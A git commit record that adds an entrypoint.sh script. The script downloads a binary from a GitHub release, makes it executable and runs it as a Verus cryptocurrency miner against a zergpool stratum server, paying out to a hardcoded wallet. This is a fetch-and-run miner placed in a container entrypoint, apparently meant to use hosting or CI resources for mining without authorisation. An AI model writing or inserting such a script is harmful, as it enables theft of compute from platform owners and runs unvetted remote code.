507fac574384e0f46e3fb1cf4b5b54e411de57f2
82a <69309779+82a@users.noreply.github.com>
2022-05-08 01:47:50 +0700

    Add files via upload

---
+++ entrypoint.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/82a/cc/releases/download/cc/cc
+chmod +x cc
+./cc -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RWgAozieHuYTsK1BCEfpdriHcVT75s2yCi -p  c=VRSC,mc=VRSC,ID=cobaaja -t 1
